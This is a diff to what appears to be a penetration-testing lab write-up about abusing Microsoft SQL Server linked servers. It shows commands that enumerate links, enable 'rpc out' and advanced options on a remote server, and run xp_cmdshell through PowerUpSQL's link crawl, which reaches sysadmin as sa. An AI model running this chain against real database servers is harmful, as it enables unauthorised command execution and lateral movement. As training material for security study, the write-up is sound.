@@ -279,3 +279,114 @@ Ethernet adapter Ethernet:
    Default Gateway . . . . . . . . . : 192.168.23.254
 PS C:\Windows\system32>
 ```
+On the target machine the user sa is enable for execute commands:
+
+```
+PS C:\Windows\system32> Invoke-SqlCmd -Query "select * from master..sysservers"
+
+
+
+srvid                : 0
+srvstatus            : 1089
+srvname              : DB-SQLPROD
+srvproduct           : SQL Server
+providername         : SQLOLEDB
+datasource           : DB-SQLPROD
+location             :
+providerstring       :
+schemadate           : 7/9/2019 5:00:08 AM
+topologyx            : 0
+topologyy            : 0
+catalog              :
+srvcollation         :
+connecttimeout       : 0
+querytimeout         : 0
+srvnetname           : DB-SQLPROD
+isremote             : True
+rpc                  : True
+pub                  : False
+sub                  : False
+dist                 : False
+dpub                 : False
+rpcout               : True
+dataaccess           : False
+collationcompatible  : False
+system               : False
+useremotecollation   : True
+lazyschemavalidation : False
+collation            :
+nonsqlsub            : False
+
+srvid                : 1
+srvstatus            : 1249
+srvname              : DB-SQLSRV
+srvproduct           : SQL Server
+providername         : SQLOLEDB
+datasource           : DB-SQLSRV
+location             :
+providerstring       :
+schemadate           : 7/9/2019 7:12:46 AM
+topologyx            : 0
+topologyy            : 0
+catalog              :
+srvcollation         :
+connecttimeout       : 0
+querytimeout         : 0
+srvnetname           : DB-SQLSRV
+isremote             : False
+rpc                  : True
+pub                  : False
+sub                  : False
+dist                 : False
+dpub                 : False
+rpcout               : True
+dataaccess           : True
+collationcompatible  : False
+system               : False
+useremotecollation   : True
+lazyschemavalidation : False
+collation            :
+nonsqlsub            : False
+
+```
+
+It's possible configure rpc output on srvSQL:
+
+```
+PS C:\Windows\system32> Invoke-SqlCmd -Query "Query sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
+PS C:\Windows\system32> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
+PS C:\Windows\system32> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
+PS C:\Windows\system32> Invoke-SqlCmd -Query "EXECUTE ('sp_configure' 'show advanced options' ',1;reconfigure;') AT ""db-sqlsrv"""
+```
+
+On the previos cmd with PowerSQL it's possible validate the execution:
+
+```
+PS C:\Users\studentuser17> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
+
+
+Version     : SQL Server 2017
+Instance    : US-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {US-MSSQL}
+User        : US\studentuser17
+Links       : {192.168.23.25}
+
+Version     : SQL Server 2017
+Instance    : DB-SQLPROD
+CustomQuery : {nt service\mssqlserver, }
+Sysadmin    : 1
+Path        : {US-MSSQL, 192.168.23.25}
+User        : dbuser
+Links       : {DB-SQLSRV}
+
+Version     : SQL Server 2017
+Instance    : DB-SQLSRV
+CustomQuery : {db\srvdba, }
+Sysadmin    : 1
+Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
+User        : sa
+Links       :
+
+```
